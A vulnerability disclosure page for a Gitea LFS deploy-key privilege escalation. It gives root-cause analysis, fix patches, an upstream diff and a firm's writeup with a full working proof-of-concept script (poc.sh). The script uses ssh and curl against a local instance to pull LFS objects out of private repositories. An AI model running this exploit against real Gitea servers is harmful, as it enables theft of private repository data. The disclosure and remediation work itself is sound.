@@ -1,0 +1,733 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ANT-2026-VN61PHA0 · go-gitea/gitea</title>
+<link rel="icon" type="image/x-icon" href="/anthropic-serve/favicon.ico">
+<script>(function(){try{var t=localStorage.getItem("cvd_theme");if(t==="light"||t==="dark")document.documentElement.setAttribute("data-theme",t);}catch(e){}})();</script>
+<link rel="stylesheet" href="../assets/site.css">
+<link rel="stylesheet" href="../assets/ledger.css">
+</head>
+<body>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-MT0111843S"></script><script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag() { dataLayer.push(arguments); }
+  gtag('js', new Date());
+  gtag('config', 'G-MT0111843S');
+</script>
+<main>
+<h1>ANT-2026-VN61PHA0 · go-gitea/gitea</h1>
+<nav class="site-nav muted">
+<a href="../index.html">Overview</a>  ·
+<a href="../ledger/index.html">Ledger</a>  ·
+<a href="../archive/index.html">Archive</a>  ·
+<a href="../about/index.html">About</a>  <span class="theme-toggle">
+    <button type="button" data-set-theme="light">Light</button>
+    <button type="button" data-set-theme="dark">Dark</button>
+    <button type="button" data-set-theme="system">System</button>
+  </span>
+</nav>
+<h2>
+  broken-authorization
+  <span class="sev-badge sev-medium">medium</span>
+</h2>
+
+<p class="id-badges">
+  <a class="id-badge" href="https://nvd.nist.gov/vuln/detail/CVE-2026-58435">CVE-2026-58435</a>
+  <a class="id-badge" href="https://github.com/advisories/GHSA-rh79-75qm-gwjr">GHSA-rh79-75qm-gwjr</a>
+</p>
+
+<p class="sev-compare">
+  <span class="sev-compare-label">Severity</span>
+  <span class="sev-compare-item">Claude <span class="sev-chip sev-high">high</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Security research firm <span class="sev-chip sev-high">high</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Maintainer <span class="sev-chip sev-medium">medium</span></span>
+</p>
+
+<p class="attribution">Discovered by
+<span class="model-chip">Claude Mythos Preview</span></p>
+
+
+<div class="marker">REPORT</div>
+<p class="section-intro">Anthropic's analysis, sealed at approval. Disclosure to the maintainer was performed by Doyensec.</p>
+<div class="report-body" tabindex="0"><h1>ANT-2026-VN61PHA0: Gitea LFS Deploy-Key Privilege Escalation — Cross-Repository Data Exfiltration</h1>
+<p>Gitea's LFS server (<code>services/lfs/server.go</code>) blindly trusts the <code>UserID</code> embedded in LFS JWT tokens and uses it as <code>ctx.Doer</code> for <strong>cross-repository</strong> privilege decisions in <code>LFSObjectAccessible()</code>. When combined with the fact that <code>routers/private/serv.go</code> sets <code>UserID = repo.OwnerID</code> for <strong>deploy keys</strong>, a holder of a write-access deploy key on <em>any single repo</em> can exfiltrate LFS objects from <em>every repo</em> the repo owner has access to — and if the owner is a site admin, from every repo on the instance.</p>
+<p>Deploy keys exist precisely to give narrow, single-repo access to CI/CD systems. This vulnerability completely defeats that isolation for LFS data.</p>
+<h2>Target</h2>
+<p><strong>Project:</strong> go-gitea/gitea<br>
+<strong>Commit:</strong> <code>cb95c8100fab6c96</code><br>
+<strong>Location:</strong> <code>serv.go:275</code><br>
+<strong>Discovery:</strong> static analysis — not yet dynamically reproduced  </p>
+<h2>Technical Details</h2>
+<p>The root cause is a trust-boundary mismatch: serv.go treats the JWT UserID as a cosmetic attribution label (setting it to repo.OwnerID for deploy keys at line 275), while server.go treats it as the authenticated principal for authorization decisions. The JWT correctly pins RepoID (checked at line 609), but LFSObjectAccessible at line 268 deliberately consults other repositories using the claimed user's permissions — and for deploy keys that claimed user is the repo owner, not the key holder. Additionally, line 613 only rejects Op!='upload' when mode==Write, so an upload-Op token is also valid for download.</p>
+<h2>Reproduction</h2>
+<p>This finding was identified by static analysis and has not yet been dynamically reproduced. The Technical Details section above describes the code path; a trigger input is not included.</p>
+<p><em>[No reproducer or sanitizer output attached — request from security-cvd@anthropic.com if needed.]</em></p>
+<h2>Acknowledgement</h2>
+<p>This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-VN61PHA0.</p>
+<hr>
+<p><strong>Reference:</strong> ANT-2026-VN61PHA0<br>
+<strong>Anthropic CVD Policy:</strong> https://www.anthropic.com/coordinated-vulnerability-disclosure</p></div>
+
+<div class="marker">SECURITY RESEARCH FIRM ANALYSIS</div>
+<p class="section-intro">Triage and disclosure were performed by Doyensec. The writeup below is the document the firm sent to the maintainer.</p>
+<dl class="vendor-analysis">
+<dt>Verdict</dt><dd><span class="verdict-chip verdict-tp">true positive</span></dd><dt>Severity</dt><dd class="sev-high">high</dd></dl>
+<div class="report-body" tabindex="0"><h2>Vulnerability Header</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Vulnerability Title</td>
+<td>Gitea LFS Deploy-Key Privilege Escalation</td>
+</tr>
+<tr>
+<td>Severity Rating</td>
+<td>High</td>
+</tr>
+<tr>
+<td>Bug Category</td>
+<td>Insufficient Authorization</td>
+</tr>
+<tr>
+<td>Location</td>
+<td><code>services/lfs/server.go:268</code>, <code>routers/private/serv.go:275</code></td>
+</tr>
+<tr>
+<td>Affected Versions</td>
+<td>1.25.5</td>
+</tr>
+</tbody>
+</table>
+<h2>Executive Summary</h2>
+<p>Gitea's LFS server (<code>services/lfs/server.go:268</code>) uses the <code>UserID</code> embedded in an LFS JWT to make cross-repository authorization decisions via <code>LFSObjectAccessible()</code>. This would be safe if the JWT <code>UserID</code> always matched the actual requesting principal — but for deploy keys, <code>routers/private/serv.go:275</code> sets <code>UserID = repo.OwnerID</code> instead of any identity representing the deploy key itself. As a result, an attacker who holds a write deploy key for any single repo owned by a victim can obtain a legitimate JWT (via the standard SSH <code>git-lfs-authenticate</code> flow) that Gitea will honor as if the victim themselves were making the request. The attacker can then exfiltrate LFS objects from any private repo the victim owns — no admin credentials, no server secrets, no brute force required. If the victim is a site administrator, every LFS object on the entire Gitea instance is reachable. Deploy keys exist precisely to grant narrow, single-repo access to CI/CD systems; this vulnerability defeats that isolation entirely for LFS data.</p>
+<h2>Root Cause Analysis</h2>
+<h3>Technical Description</h3>
+<p>The vulnerability is a <strong>trust-boundary confusion</strong> across two independent subsystems. When a deploy key authenticates over SSH, <code>serv.go</code> sets <code>UserID = repo.OwnerID</code> because the code has no better representation for a deploy key identity (a <code>FIXME</code> comment acknowledges this). That <code>UserID</code> is baked verbatim into the LFS JWT by <code>cmd/serv.go</code>. The JWT is then consumed by <code>server.go</code>, which treats <code>claims.UserID</code> as the authenticated principal and loads that user object as <code>ctx.Doer</code>. When the batch upload handler encounters an object that exists on disk but isn't yet linked to the target repo, it calls <code>LFSObjectAccessible(ctx, ctx.Doer, oid)</code> — a global query across all repos the claimed user can see — to decide whether to silently create the cross-repo link. The JWT's <code>RepoID</code> claim is verified (so the request is correctly scoped to one repo at the HTTP level), but the <code>UserID</code> driving the cross-repo access decision is the repo <em>owner</em>, not the deploy key. The attacker ends up holding a valid, server-signed token that impersonates the victim for any LFS authorization check.</p>
+<h3>First Faulty Condition</h3>
+<p>The primary bug — where the JWT <code>UserID</code> is set incorrectly — is in <code>serv.go</code>:</p>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th><code>routers/private/serv.go</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Line</td>
+<td>275</td>
+</tr>
+<tr>
+<td>Condition</td>
+<td>Deploy key branch sets <code>results.UserID = repo.OwnerID</code>; the owner's UID is embedded in the JWT and later used as the authenticated principal for cross-repo privilege decisions in <code>server.go:268</code></td>
+</tr>
+</tbody>
+</table>
+<pre tabindex="0"><code class="language-go">// routers/private/serv.go:252–278
+if key.Type == asymkey_model.KeyTypeDeploy {
+    ...
+    // FIXME: Deploy keys aren't really the owner of the repo pushing changes
+    // however we don't have good way of representing deploy keys in hook.go
+    // so for now use the owner of the repository
+    results.UserName = results.OwnerName
+    results.UserID = repo.OwnerID    // ← OWNER's UID, not the deploy key
+    ...
+}
+</code></pre>
+<p>The secondary bug — where the tainted <code>UserID</code> is actually misused — is in <code>server.go</code>:</p>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th><code>services/lfs/server.go</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Line</td>
+<td>268</td>
+</tr>
+<tr>
+<td>Condition</td>
+<td><code>LFSObjectAccessible(ctx, ctx.Doer, oid)</code> makes a cross-repo decision using the JWT <code>UserID</code>, which for deploy keys is the repo owner, not the deploy key holder</td>
+</tr>
+</tbody>
+</table>
+<pre tabindex="0"><code class="language-go">// services/lfs/server.go:267–275
+if exists &amp;&amp; meta == nil {
+    accessible, err := git_model.LFSObjectAccessible(ctx, ctx.Doer, p.Oid)
+    ...
+    if accessible {
+        _, err := git_model.NewLFSMetaObject(ctx, repository.ID, p)  // links OID to attacker's repo
+        ...
+    }
+}
+</code></pre>
+<p><strong>Admin amplification:</strong> if <code>victim.IsAdmin</code>, <code>models/git/lfs.go:226</code> short-circuits with a bare <code>COUNT(*)</code> over the entire <code>lfs_meta_object</code> table — no repo filter. A deploy key on any admin-owned repo reaches every LFS object on the instance.</p>
+<h2>Exploitability Assessment</h2>
+<h3>Attack Vector &amp; Reachability</h3>
+<table>
+<thead>
+<tr>
+<th>Attack vector</th>
+<th>Network</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Authentication required</td>
+<td>Low: attacker must hold a write deploy key's private key material for any of victim's repositories</td>
+</tr>
+<tr>
+<td>User interaction required</td>
+<td>None</td>
+</tr>
+<tr>
+<td>Reachable in default config</td>
+<td>No. Requires <code>LFS_START_SERVER = true</code></td>
+</tr>
+<tr>
+<td>Entry point(s)</td>
+<td>SSH <code>git-lfs-authenticate</code> command + HTTP LFS batch API</td>
+</tr>
+</tbody>
+</table>
+<p>The practical exploitability of this vulnerability is constrained by a second prerequisite that is independent of the authorization bypass itself: the attacker must know the SHA-256 OID of a specific LFS object in the target repository. OIDs are 256-bit digests — not enumerable and not brute-forceable — and the LFS batch endpoint functions only as an existence oracle, not a listing mechanism. Successful exploitation therefore requires a prior information-disclosure path that exposes OIDs outside the repository boundary. Known paths include public forks that retain stale LFS pointer files in git history, former collaborators who retained object references from a prior <code>git pull</code>, and issue or pull request comments that reference pointer file contents. </p>
+<p>LFS pointer files are committed in plaintext to git history, so anyone who ever cloned or had read access to the target repo retains all OIDs permanently. The attack is effectively a <strong>post-revocation persistence</strong> primitive — after a collaborator loses access, they can continue downloading updated versions of LFS files they previously knew existed.</p>
+<h3>Reproduction Steps</h3>
+<p><strong>Environment</strong></p>
+<p>The issue was reproduced using <code>gitea/gitea:1.25.5</code> docker image. </p>
+<p><strong>Setup</strong> (performed as victim/admin — represents normal deployment state)</p>
+<pre tabindex="0"><code class="language-bash"># 1. Victim creates a private repo and uploads an LFS object
+git clone http://victim:PASSWORD@localhost:3000/victim/secret-repo.git
+cd secret-repo
+git lfs track &quot;*.bin&quot;
+echo &quot;TOP SECRET: password is hunter2&quot; &gt; secret.bin
+git add .gitattributes secret.bin &amp;&amp; git commit -m &quot;secret&quot;
+git push &amp;&amp; git lfs push origin main
+
+# Note the OID and size from:
+git lfs pointer --file=secret.bin
+# oid sha256:1d4fed31944373fcc761b70a2efc4a9731bc3a007c63ecee22ccd5b93bb6483b
+# size 32
+
+# 2. Victim creates ci-repo and registers a write deploy key
+#    (via UI: ci-repo → Settings → Deploy Keys → Add Deploy Key → enable write access)
+#    Attacker holds the corresponding private key (e.g. leaked from CI config)
+</code></pre>
+<p><strong>Exploit</strong></p>
+<pre tabindex="0"><code class="language-bash"># Step 1 — Obtain JWT via SSH using only the deploy key (no victim credentials)
+ssh -i ~/.ssh/deploy_key -p 2222 git@localhost \
+  &quot;git-lfs-authenticate victim/ci-repo upload&quot;
+# → {&quot;header&quot;:{&quot;Authorization&quot;:&quot;Bearer eyJ...&quot;},&quot;href&quot;:&quot;...&quot;}
+# Decode payload: {&quot;RepoID&quot;:3,&quot;Op&quot;:&quot;upload&quot;,&quot;UserID&quot;:4,...}
+#                                              ^^^^^^^^ victim's UID — BUG
+
+JWT=&quot;eyJ...&quot;
+OID=&quot;1d4fed31944373fcc761b70a2efc4a9731bc3a007c63ecee22ccd5b93bb6483b&quot;
+SIZE=32
+
+# Step 2 — Confirm attacker is blocked from secret-repo directly
+curl -s -H &quot;Authorization: Bearer $JWT&quot; \
+  &quot;http://localhost:3000/victim/secret-repo.git/info/lfs/objects/$OID&quot;
+# → {&quot;Message&quot;:&quot;Unauthorized&quot;}  — correctly blocked
+
+# Step 3 — Batch upload to ci-repo claiming the secret OID
+curl -s -X POST \
+  -H &quot;Authorization: Bearer $JWT&quot; \
+  -H &quot;Accept: application/vnd.git-lfs+json&quot; \
+  -H &quot;Content-Type: application/vnd.git-lfs+json&quot; \
+  &quot;http://localhost:3000/victim/ci-repo.git/info/lfs/objects/batch&quot; \
+  -d &quot;{\&quot;operation\&quot;:\&quot;upload\&quot;,\&quot;transfers\&quot;:[\&quot;basic\&quot;],\&quot;objects\&quot;:[{\&quot;oid\&quot;:\&quot;$OID\&quot;,\&quot;size\&quot;:$SIZE}]}&quot;
+# → {&quot;objects&quot;:[{&quot;oid&quot;:&quot;1d4fed...&quot;,&quot;size&quot;:32}]}  — NO &quot;actions&quot; field
+#   server silently linked the OID to ci-repo without demanding proof of possession
+
+# Step 4 — Download the secret via ci-repo
+curl -s -H &quot;Authorization: Bearer $JWT&quot; \
+  &quot;http://localhost:3000/victim/ci-repo.git/info/lfs/objects/$OID&quot;
+# → TOP SECRET: password is hunter2
+</code></pre>
+<p><strong>Expected output</strong></p>
+<pre tabindex="0"><code>Step 2:  {&quot;Message&quot;:&quot;Unauthorized&quot;}          ← blocked from secret-repo
+Step 3:  {&quot;objects&quot;:[{&quot;oid&quot;:&quot;1d4fed...&quot;,&quot;size&quot;:32}]}  ← no actions = silently linked
+Step 4:  TOP SECRET: password is hunter2     ← exfiltrated via ci-repo
+</code></pre>
+<p><strong>PoC files</strong></p>
+<ul>
+<li><code>poc.sh</code> — end-to-end PoC using real SSH deploy key</li>
+</ul>
+<h2>Recommended Fix</h2>
+<p>A proper fix might require significant architecture change. A short term recommendation is presented below:</p>
+<p><strong>Fix 1 — <code>services/lfs/server.go:267</code> (defense in depth, immediately effective)</strong></p>
+<p>Remove the <code>LFSObjectAccessible</code> cross-repo shortcut. Require proof of possession (the normal upload flow) for any object not already linked to the target repo. The JWT is correctly scoped to one <code>RepoID</code>; authorization decisions about <em>other</em> repos should not be made using the JWT <code>UserID</code>.</p>
+<pre tabindex="0"><code class="language-go">// BEFORE (vulnerable):
+if exists &amp;&amp; meta == nil {
+    accessible, err := git_model.LFSObjectAccessible(ctx, ctx.Doer, p.Oid)
+    if err != nil {
+        log.Error(&quot;Unable to check if LFS MetaObject [%s] is accessible: %v&quot;, p.Oid, err)
+        writeStatus(ctx, http.StatusInternalServerError)
+        return
+    }
+    if accessible {
+        _, err := git_model.NewLFSMetaObject(ctx, repository.ID, p)
+        if err != nil {
+            log.Error(&quot;Unable to create LFS MetaObject [%s] for %s/%s. Error: %v&quot;, p.Oid, rc.User, rc.Repo, err)
+            writeStatus(ctx, http.StatusInternalServerError)
+            return
+        }
+    } else {
+        exists = false
+    }
+}
+</code></pre>
+<pre tabindex="0"><code class="language-go">// After (safe):
+if exists &amp;&amp; meta == nil {
+    // Do not use ctx.Doer for cross-repo decisions — the JWT only authorizes
+    // access to this repo. Always require proof-of-possession for objects
+    // not already linked here.
+    exists = false
+}
+</code></pre>
+<p>The client will re-upload the bytes (which are hash-verified). 
+Performance cost: one redundant upload per cross-repo object. Security gain: the cross-repo trust boundary is enforced regardless of how the JWT was issued.</p>
+<p><strong>Fix 2 — <code>routers/private/serv.go:275</code> (fix the source)</strong></p>
+<p>Stop embedding <code>repo.OwnerID</code> in the JWT for deploy keys. Options:
+- Add a <code>DeployKeyID</code> field to the JWT <code>Claims</code> struct; teach <code>handleLFSToken</code> to construct a minimal synthetic principal with exactly the deploy key's permissions (single-repo, mode-limited).
+- Or mint a separate JWT type for deploy keys that <code>server.go</code> treats as repo-scoped only, refusing to use it for cross-repo operations.</p>
+<p>Patch provenance: AI-generated + Human-reviewed</p>
+<h2>References</h2>
+<ul>
+<li>CWE-639: Authorization Bypass Through User-Controlled Key</li>
+<li>CWE-266: Incorrect Privilege Assignment</li>
+</ul>
+<h2>Attribution</h2>
+<p>This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by Adrian Denkiewicz at Doyensec in collaboration with Anthropic Research.</p>
+<p>For CVE credits and public acknowledgments: Doyensec in collaboration with Claude and Anthropic Research.</p>
+<h2>Attachment: <code>fix1.patch</code></h2>
+<pre tabindex="0"><code>diff --git a/services/lfs/server.go b/services/lfs/server.go
+index 4f3bbe9eb5..aa81b2c828 100644
+--- a/services/lfs/server.go
++++ b/services/lfs/server.go
+@@ -265,22 +265,13 @@ func BatchHandler(ctx *context.Context) {
+            }
+
+            if exists &amp;&amp; meta == nil {
+-               accessible, err := git_model.LFSObjectAccessible(ctx, ctx.Doer, p.Oid)
+-               if err != nil {
+-                   log.Error(&quot;Unable to check if LFS MetaObject [%s] is accessible. Error: %v&quot;, p.Oid, err)
+-                   writeStatus(ctx, http.StatusInternalServerError)
+-                   return
+-               }
+-               if accessible {
+-                   _, err := git_model.NewLFSMetaObject(ctx, repository.ID, p)
+-                   if err != nil {
+-                       log.Error(&quot;Unable to create LFS MetaObject [%s] for %s/%s. Error: %v&quot;, p.Oid, rc.User, rc.Repo, err)
+-                       writeStatus(ctx, http.StatusInternalServerError)
+-                       return
+-                   }
+-               } else {
+-                   exists = false
+-               }
++               // Do not use ctx.Doer for cross-repository access decisions.
++               // The JWT authorizes access to this repository only; using
++               // LFSObjectAccessible here allows a deploy-key JWT (which
++               // carries the repo owner's UserID rather than the key's own
++               // identity) to silently link LFS objects from other private
++               // repositories. Require proof of possession instead.
++               exists = false
+            }
+
+            responseObject = buildObjectResponse(rc, p, false, !exists, err)
+</code></pre>
+<h2>Attachment: <code>poc.sh</code></h2>
+<pre tabindex="0"><code>#!/bin/bash
+################################################################################
+# PoC: Gitea LFS Deploy-Key Privilege Escalation 
+#
+# REQUIRED SETUP (manual — not automated here):
+#
+#   1. Gitea with LFS_START_SERVER=true and SSH enabled
+#
+#   2. Two repos owned by the same victim user:
+#        victim/repo-no-deploy-key  — PRIVATE, contains LFS objects (the target)
+#        victim/ci-repo             — any visibility, has a write deploy key registered
+#
+#   3. LFS content must be uploaded to repo-no-deploy-key:
+#        git clone http://victim:PASS@HOST/victim/repo-no-deploy-key.git
+#        cd repo-no-deploy-key &amp;&amp; git lfs track &quot;*.bin&quot;
+#        echo &quot;TOP SECRET: password is hunter2&quot; &gt; secret.bin
+#        git add .gitattributes secret.bin &amp;&amp; git commit -m &quot;secret&quot;
+#        git push &amp;&amp; git lfs push origin main
+#
+#   4. The private key corresponding to the write deploy key on ci-repo must be
+#      available locally (DEPLOY_KEY_FILE below).
+#
+#   5. OID and SIZE must be set to the LFS object in repo-no-deploy-key:
+#        git lfs pointer --file=secret.bin
+#
+# ATTACKER'S POSITION:
+#   - Holds private key of a write deploy key on victim/ci-repo
+#   - Has NO credentials for victim's Gitea account
+#   - Has NO access to victim/repo-no-deploy-key
+################################################################################
+
+set -e
+
+# ---------------------------------------------------------------------------
+# CONFIGURATION — adjust to match your environment
+# ---------------------------------------------------------------------------
+GITEA_HOST=&quot;localhost&quot;
+GITEA_SSH_PORT=&quot;2222&quot;
+GITEA_HTTP=&quot;http://localhost:3000&quot;
+
+DEPLOY_KEY_FILE=&quot;$HOME/.ssh/deploy-key&quot;   # private key for ci-repo deploy key
+VICTIM_USER=&quot;victim&quot;
+CI_REPO=&quot;ci-repo&quot;           # repo the deploy key is registered on
+SECRET_REPO=&quot;repo-no-deploy-key&quot;   # private repo to exfiltrate from (no deploy key)
+
+OID=&quot;1d4fed31944373fcc761b70a2efc4a9731bc3a007c63ecee22ccd5b93bb6483b&quot;
+SIZE=32
+# ---------------------------------------------------------------------------
+
+echo &quot;&quot;
+echo &quot;================================================================================&quot;
+echo &quot; PoC3: Gitea LFS Deploy-Key Privilege Escalation&quot;
+echo &quot;================================================================================&quot;
+
+echo &quot;&quot;
+echo &quot;--------------------------------------------------------------------------------&quot;
+echo &quot;[1] Obtain LFS JWT via SSH using only the deploy key&quot;
+echo &quot;&quot;
+echo &quot;  ssh -i $DEPLOY_KEY_FILE -p $GITEA_SSH_PORT git@$GITEA_HOST \\&quot;
+echo &quot;    'git-lfs-authenticate $VICTIM_USER/$CI_REPO upload'&quot;
+echo &quot;&quot;
+
+SSH_OUT=$(ssh -i &quot;$DEPLOY_KEY_FILE&quot; -p &quot;$GITEA_SSH_PORT&quot; \
+  -o StrictHostKeyChecking=no -o BatchMode=yes \
+  git@&quot;$GITEA_HOST&quot; &quot;git-lfs-authenticate $VICTIM_USER/$CI_REPO upload&quot;)
+
+echo &quot;  Raw SSH output: $SSH_OUT&quot;
+
+JWT=$(echo &quot;$SSH_OUT&quot; | python3 -c \
+  &quot;import sys,json; print(json.load(sys.stdin)['header']['Authorization'].split(' ')[1])&quot;)
+
+echo &quot;&quot;
+echo &quot;  JWT: $JWT&quot;
+echo &quot;&quot;
+
+# Decode and display claims
+CLAIMS=$(echo &quot;$JWT&quot; | cut -d. -f2 | python3 -c &quot;
+import sys, base64, json
+p = sys.stdin.read().strip()
+p += '=' * (-len(p) % 4)
+print(json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=2))
+&quot;)
+echo &quot;  JWT claims:&quot;
+echo &quot;$CLAIMS&quot; | sed 's/^/    /'
+echo &quot;&quot;
+
+JWT_USER_ID=$(echo &quot;$CLAIMS&quot; | python3 -c &quot;import sys,json; print(json.load(sys.stdin)['UserID'])&quot;)
+echo &quot;  UserID in JWT: $JWT_USER_ID&quot;
+echo &quot;&quot;
+echo &quot;  ^^^ This should be the VICTIM's UID (repo.OwnerID), NOT a deploy-key UID.&quot;
+echo &quot;      routers/private/serv.go:275: results.UserID = repo.OwnerID  ← BUG&quot;
+
+echo &quot;&quot;
+echo &quot;--------------------------------------------------------------------------------&quot;
+echo &quot;[2] Confirm attacker is BLOCKED from repo-no-deploy-key directly&quot;
+echo &quot;&quot;
+
+R=$(curl -s -w '|%{http_code}' \
+  -H &quot;Authorization: Bearer $JWT&quot; \
+  &quot;$GITEA_HTTP/$VICTIM_USER/$SECRET_REPO.git/info/lfs/objects/$OID&quot;)
+HTTP=&quot;${R##*|}&quot;
+BODY=&quot;${R%|*}&quot;
+echo &quot;  GET $GITEA_HTTP/$VICTIM_USER/$SECRET_REPO.git/info/lfs/objects/$OID&quot;
+echo &quot;  HTTP $HTTP: $BODY&quot;
+if [ &quot;$HTTP&quot; = &quot;200&quot; ]; then
+  echo &quot;  ERROR: direct access succeeded — repo-no-deploy-key may not be private!&quot;
+  exit 1
+fi
+echo &quot;  → Correctly blocked (deploy key has no access to $SECRET_REPO)&quot;
+
+echo &quot;&quot;
+echo &quot;--------------------------------------------------------------------------------&quot;
+echo &quot;[3] Batch 'upload' to ci-repo claiming the secret OID&quot;
+echo &quot;&quot;
+echo &quot;  The JWT is scoped to ci-repo (RepoID check passes).&quot;
+echo &quot;  server.go sees the OID exists on disk, not linked to ci-repo, then calls:&quot;
+echo &quot;  LFSObjectAccessible(ctx, victim, oid) — a GLOBAL query across all victim repos.&quot;
+echo &quot;  Finds OID in repo-no-deploy-key → TRUE → links OID to ci-repo. No proof demanded.&quot;
+echo &quot;&quot;
+
+BATCH_RESP=$(curl -s -X POST \
+  -H &quot;Authorization: Bearer $JWT&quot; \
+  -H &quot;Accept: application/vnd.git-lfs+json&quot; \
+  -H &quot;Content-Type: application/vnd.git-lfs+json&quot; \
+  &quot;$GITEA_HTTP/$VICTIM_USER/$CI_REPO.git/info/lfs/objects/batch&quot; \
+  -d &quot;{\&quot;operation\&quot;:\&quot;upload\&quot;,\&quot;transfers\&quot;:[\&quot;basic\&quot;],\&quot;objects\&quot;:[{\&quot;oid\&quot;:\&quot;$OID\&quot;,\&quot;size\&quot;:$SIZE}]}&quot;)
+
+echo &quot;  Response: $BATCH_RESP&quot;
+echo &quot;&quot;
+
+HAS_ACTIONS=$(echo &quot;$BATCH_RESP&quot; | python3 -c \
+  &quot;import sys,json; print('yes' if json.load(sys.stdin)['objects'][0].get('actions') else 'no')&quot; 2&gt;/dev/null)
+
+if [ &quot;$HAS_ACTIONS&quot; = &quot;yes&quot; ]; then
+  echo &quot;  EXPLOIT FAILED at step 3: server returned actions (proof of possession demanded).&quot;
+  echo &quot;  LFS content may not have been uploaded to repo-no-deploy-key. Check setup.&quot;
+  exit 1
+fi
+echo &quot;  ^^^ No 'actions' field — server silently linked the OID to $CI_REPO.&quot;
+echo &quot;      Contrast: a non-privileged JWT gets actions:[upload,verify] (proof demanded).&quot;
+
+echo &quot;&quot;
+echo &quot;--------------------------------------------------------------------------------&quot;
+echo &quot;[4] Download secret content from ci-repo using the deploy-key JWT&quot;
+echo &quot;&quot;
+
+STOLEN=$(curl -s \
+  -H &quot;Authorization: Bearer $JWT&quot; \
+  &quot;$GITEA_HTTP/$VICTIM_USER/$CI_REPO.git/info/lfs/objects/$OID&quot;)
+HTTP=$(curl -s -o /dev/null -w '%{http_code}' \
+  -H &quot;Authorization: Bearer $JWT&quot; \
+  &quot;$GITEA_HTTP/$VICTIM_USER/$CI_REPO.git/info/lfs/objects/$OID&quot;)
+
+echo &quot;  GET $GITEA_HTTP/$VICTIM_USER/$CI_REPO.git/info/lfs/objects/$OID&quot;
+echo &quot;  HTTP $HTTP&quot;
+echo &quot;  &gt;&gt;&gt; STOLEN: $STOLEN&quot;
+
+echo &quot;&quot;
+echo &quot;================================================================================&quot;
+echo &quot; VERDICT&quot;
+echo &quot;================================================================================&quot;
+echo &quot;&quot;
+echo &quot;  Attack chain:&quot;
+echo &quot;  1. ssh -i deploy_key → JWT{UserID=$JWT_USER_ID} (victim impersonated by serv.go)&quot;
+echo &quot;  2. Direct access to $SECRET_REPO → BLOCKED ($HTTP_DIRECT)&quot;
+echo &quot;  3. Batch upload to $CI_REPO with OID from $SECRET_REPO → silently linked&quot;
+echo &quot;  4. Download from $CI_REPO → HTTP $HTTP&quot;
+echo &quot;&quot;
+
+if [ &quot;$HTTP&quot; = &quot;200&quot; ]; then
+  echo &quot;  *** VULNERABILITY CONFIRMED (end-to-end, no JWT forging) ***&quot;
+  echo &quot;&quot;
+  echo &quot;  A write deploy key scoped to $CI_REPO was used to exfiltrate LFS&quot;
+  echo &quot;  content from $SECRET_REPO, which the deploy key has no access to.&quot;
+  echo &quot;  No server secrets were used — only the deploy key's private key material.&quot;
+  echo &quot;&quot;
+  echo &quot;  Stolen: '$STOLEN'&quot;
+  exit 0
+else
+  echo &quot;  EXPLOIT FAILED — HTTP $HTTP, got: $STOLEN&quot;
+  exit 1
+fi
+</code></pre></div>
+
+
+<div class="marker">UPSTREAM FIX</div>
+<p class="section-intro">The change that resolved this finding.</p>
+<div class="diff-block"><pre class="diff" tabindex="0"><code><span class="diff-h">diff --git a/services/lfs/server.go b/services/lfs/server.go</span>
+<span class="diff-h">index 6340b06252141..8c7de2ccb655b 100644</span>
+<span class="diff-h">--- a/services/lfs/server.go</span>
+<span class="diff-h">+++ b/services/lfs/server.go</span>
+<span class="diff-h">@@ -254,6 +254,17 @@ func BatchHandler(ctx *context.Context) {</span>
+<span class="diff-c"> </span>
+<span class="diff-c"> 		var responseObject *lfs_module.ObjectResponse</span>
+<span class="diff-c"> 		if isUpload {</span>
+<span class="diff-a">+			if exists &amp;&amp; meta == nil {</span>
+<span class="diff-a">+				// The object exists in the content store but is not linked to this</span>
+<span class="diff-a">+				// repo. Do not auto-link it based on cross-repo access: the token</span>
+<span class="diff-a">+				// only authorizes this repo, and for deploy keys ctx.Doer is the</span>
+<span class="diff-a">+				// repo owner, so trusting it here would let a single-repo key pull</span>
+<span class="diff-a">+				// objects from any repo the owner can see. Require proof of</span>
+<span class="diff-a">+				// possession by making the client upload the (hash-verified) bytes,</span>
+<span class="diff-a">+				// and treat it as a new upload for size-limit enforcement below.</span>
+<span class="diff-a">+				exists = false</span>
+<span class="diff-a">+			}</span>
+<span class="diff-a">+</span>
+<span class="diff-c"> 			var err *lfs_module.ObjectError</span>
+<span class="diff-c"> 			if !exists &amp;&amp; setting.LFS.MaxFileSize &gt; 0 &amp;&amp; p.Size &gt; setting.LFS.MaxFileSize {</span>
+<span class="diff-c"> 				err = &amp;lfs_module.ObjectError{</span>
+<span class="diff-h">@@ -262,25 +273,6 @@ func BatchHandler(ctx *context.Context) {</span>
+<span class="diff-c"> 				}</span>
+<span class="diff-c"> 			}</span>
+<span class="diff-c"> </span>
+<span class="diff-d">-			if exists &amp;&amp; meta == nil {</span>
+<span class="diff-d">-				accessible, err := git_model.LFSObjectAccessible(ctx, ctx.Doer, p.Oid)</span>
+<span class="diff-d">-				if err != nil {</span>
+<span class="diff-d">-					log.Error(&quot;Unable to check if LFS MetaObject [%s] is accessible. Error: %v&quot;, p.Oid, err)</span>
+<span class="diff-d">-					writeStatus(ctx, http.StatusInternalServerError)</span>
+<span class="diff-d">-					return</span>
+<span class="diff-d">-				}</span>
+<span class="diff-d">-				if accessible {</span>
+<span class="diff-d">-					_, err := git_model.NewLFSMetaObject(ctx, repository.ID, p)</span>
+<span class="diff-d">-					if err != nil {</span>
